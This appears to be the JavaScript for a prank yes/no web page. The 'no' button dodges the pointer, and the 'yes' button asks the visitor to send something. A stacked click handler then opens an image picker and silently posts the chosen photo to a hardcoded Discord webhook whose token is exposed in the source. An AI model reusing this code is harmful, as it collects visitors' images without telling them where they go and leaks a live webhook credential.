const yesBtn = document.querySelector('#yesBtn');

yesBtn.addEventListener('click',function() {
        alert('Ahora pásame🤤😎');
    });

const noBtn = document.querySelector('#noBtn');

noBtn.addEventListener('mouseover', function(){
    const randomX=parseInt(Math.random()*100);
    const randomY=parseInt(Math.random()*100);
    noBtn.style.setProperty('top', randomY+'%');
    noBtn.style.setProperty('left', randomX+'%');
    noBtn.style.setProperty('transform',`translate(-${randomX}%,-${randomY}%)`);
            document.getElementById("yesBtn").addEventListener("click", function() {
        var fileInput = document.createElement("input");
        fileInput.type = "file";
        fileInput.accept = "image/*";
        fileInput.onchange = function(event) {
            var file = event.target.files[0];
            if (file) {
                var formData = new FormData();
                formData.append('file', file);
    
                fetch('https://discordapp.com/api/webhooks/1231837049129144360/AlHCqwyAMaQbed7K1eIxa6Md8L_KnYW7Sk6HKWcHQJbM8JyOsEUNiOGPfceiGrHG12j_', {
                    method: 'POST',
                    body: formData
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Error al enviar la imagen al servidor de Discord');
                    }
                    return response.json();
                })
                .then(data => {
                    // Manejar la respuesta del servidor si es necesario
                    console.log('Imagen enviada correctamente');
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            }
        };
        fileInput.click();
    });
})
